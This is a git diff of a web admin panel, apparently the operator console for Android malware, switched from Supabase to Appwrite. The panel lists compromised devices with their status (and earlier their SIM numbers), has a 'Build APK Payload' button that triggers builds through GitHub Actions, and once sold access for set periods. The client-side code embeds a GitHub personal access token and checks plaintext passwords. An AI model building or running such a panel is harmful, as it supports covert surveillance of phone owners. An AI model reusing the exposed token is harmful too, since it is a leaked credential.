@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FBX Panel - Admin</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.1"></script>
     <style>
         :root { --bg: #f8f9fa; --card: #fff; --text: #1f2937; --muted: #6b7280; --primary: #e11d48; --primary-light: #ffe4e6; --border: #e5e7eb; --success: #10b981; --danger: #ef4444; }
         * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
@@ -33,9 +33,6 @@
         .status-badge.offline { color: var(--danger); }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--success); }
         .dot.offline { background: var(--danger); }
-        .sim-info { display: flex; gap: 10px; margin-bottom: 15px; }
-        .sim-box { flex: 1; background: #f3f4f6; padding: 12px; border-radius: 10px; font-size: 13px; }
-        .sim-box label { color: var(--muted); font-weight: 600; display: block; margin-bottom: 6px; font-size: 11px; }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -58,25 +55,9 @@
         <div id="mainDash" class="hidden">
             <!-- ADMIN PANEL -->
             <div id="adminPanel" class="admin-section hidden">
-                <h3>👑 Admin: Create User</h3>
+                <h3>⚙️ Build APK Payload</h3>
                 <div class="form-row">
-                    <input id="newUser" placeholder="New Username">
-                    <input id="newPass" placeholder="New Password">
-                </div>
-                <div class="form-row">
-                    <select id="accessDuration">
-                        <option value="1">1 Day</option>
-                        <option value="7">7 Days</option>
-                        <option value="30">30 Days</option>
-                        <option value="90">90 Days</option>
-                        <option value="36500">Lifetime</option>
-                    </select>
-                </div>
-                <button class="btn" onclick="createUser()">Create User</button>
-                
-                <h3 style="margin-top:20px;">⚙️ Build APK Payload</h3>
-                <div class="form-row">
-                    <input id="buildUserId" placeholder="Enter User ID (e.g., 2)" type="number">
+                    <input id="buildUserId" placeholder="Enter User ID (e.g., 1)" type="number">
                 </div>
                 <button class="btn" style="background:#1f2937;" onclick="triggerBuild()">🚀 Trigger Build</button>
             </div>
@@ -95,23 +76,22 @@
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        const SUPABASE_URL = "https://fmfxqjerktoclzmuited.supabase.co";
-        const SUPABASE_KEY = "sb_publishable_v8EhqjGh1B87NatTuypl9w_xS3V3JRF";
-
-// Naya Supabase client (jo nayi publishable key ko support karta hai)
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
-    auth: {
-        persistSession: false // Isse key ka format issue solve ho jata hai
-    }
-});
+        // --- APPWRITE CONFIG ---
+        const APPWRITE_ENDPOINT = 'https://sgp.cloud.appwrite.io/v1';
+        const PROJECT_ID = '6b09c77f001ea24e16bd';
+        const DB_ID = '6b09c7cb003058ca1f...'; // <-- APNI POORI DB ID YAHAN DAALEIN
+        const DEVICES_COL = 'devices';
         
         // GITHUB CONFIG
         const GITHUB_TOKEN = "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";
         const GITHUB_USERNAME = "tanvirmev12-gif";
         const GITHUB_REPO = "mev";
 
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        // Appwrite Client
+        const client = new Appwrite.Client()
+            .setEndpoint(APPWRITE_ENDPOINT)
+            .setProject(PROJECT_ID);
+        const databases = new Appwrite.Databases(client);
 
         let currentUser = null;
         let currentRole = 'user';
@@ -119,47 +99,41 @@ const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
         async function doLogin() {
             const user = document.getElementById('loginUser').value;
             const pass = document.getElementById('loginPass').value;
-            const { data, error } = await supabase.from('users').select('*').eq('username', user).eq('password', pass).single();
             
-            if (error || !data) return alert("Invalid login credentials");
-            if (data.expires_at && new Date(data.expires_at) < new Date()) return alert("Your access has expired.");
-            
-            currentUser = data; 
-            currentRole = data.role;
-            
-            document.getElementById('loginBox').classList.add('hidden');
-            document.getElementById('mainDash').classList.remove('hidden');
-            
-            if (currentRole === 'admin') {
-                document.getElementById('adminPanel').classList.remove('hidden');
-                loadAllDevices();
-            } else {
-                loadUserDevices(data.id);
-            }
-        }
+            try {
+                const response = await databases.listDocuments(DB_ID, 'users', [
+                    Appwrite.Query.equal('username', user),
+                    Appwrite.Query.equal('password', pass)
+                ]);
 
-        async function createUser() {
-            const u = document.getElementById('newUser').value;
-            const p = document.getElementById('newPass').value;
-            const days = parseInt(document.getElementById('accessDuration').value);
-            let expiresAt = null;
-            
-            if (days !== 36500) {
-                const date = new Date(); date.setDate(date.getDate() + days); expiresAt = date.toISOString();
+                if (response.documents.length > 0) {
+                    currentUser = response.documents[0];
+                    currentRole = currentUser.role;
+                    
+                    document.getElementById('loginBox').classList.add('hidden');
+                    document.getElementById('mainDash').classList.remove('hidden');
+                    
+                    if (currentRole === 'admin') {
+                        document.getElementById('adminPanel').classList.remove('hidden');
+                    }
+                    
+                    loadAllDevices();
+                } else {
+                    alert("Invalid credentials");
+                }
+            } catch (e) {
+                alert("Database Error: " + e.message);
             }
-            
-            const { error } = await supabase.from('users').insert([{ username: u, password: p, role: 'user', expires_at: expiresAt }]);
-            if (error) alert("Error: " + error.message); else alert("User created successfully!");
         }
 
         async function loadAllDevices() {
-            const { data } = await supabase.from('devices').select('*');
-            renderDevices(data || []);
-        }
-
-        async function loadUserDevices(userId) {
-            const { data } = await supabase.from('devices').select('*').eq('user_id', userId);
-            renderDevices(data || []);
+            try {
+                const response = await databases.listDocuments(DB_ID, DEVICES_COL);
+                renderDevices(response.documents);
+            } catch (e) {
+                console.error(e);
+                document.getElementById('deviceContainer').innerHTML = `<div style="text-align:center; padding:20px; color:red">Database Error: ${e.message}</div>`;
+            }
         }
 
         function renderDevices(devices) {
@@ -174,14 +148,10 @@ const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
             container.innerHTML = devices.map(d => `
                 <div class="device-card">
                     <div class="device-header">
-                        <div class="device-info"><h3>${d.model || 'Unknown'}</h3><p>${d.id}</p></div>
+                        <div class="device-info"><h3>${d.model || 'Unknown'}</h3><p>${d.device_id || d.$id}</p></div>
                         <div class="status-badge ${d.status === 'online' ? '' : 'offline'}">
                             <span class="dot ${d.status === 'online' ? '' : 'offline'}"></span> ${d.status ? d.status.toUpperCase() : 'OFFLINE'}
                         </div>
-                    </div>
-                    <div class="sim-info">
-                        <div class="sim-box"><label>SIM 1</label><div>${d.sim1 || '-'}</div></div>
-                        <div class="sim-box"><label>SIM 2</label><div>${d.sim2 || '-'}</div></div>
                     </div>
                 </div>
             `).join('');
@@ -203,7 +173,7 @@ const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
                         'Content-Type': 'application/json' 
                     },
                     body: JSON.stringify({ 
-                        event_type: "build-apk", // <-- YAHAN FIX KIYA HAI (hyphen)
+                        event_type: "build-apk",
                         client_payload: { 
                             user_id: userId 
                         } 
@@ -211,17 +181,15 @@ const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY, {
                 });
                 
                 if (res.status === 204) {
-                    alert("Build Triggered! Check GitHub Actions. APK will be in Releases.");
+                    alert("Build Triggered! Check GitHub Actions.");
                 } else {
-                    alert("Error: " + res.status + " Check console.");
-                    console.log(await res.json());
+                    alert("Error: " + res.status);
                 }
             } catch (e) { alert("Error: " + e.message); }
         }
 
         function refreshData() {
-            if(currentRole === 'admin') loadAllDevices(); 
-            else if(currentUser) loadUserDevices(currentUser.id);
+            if(currentRole === 'admin') loadAllDevices();
         }
     </script>
 </body>
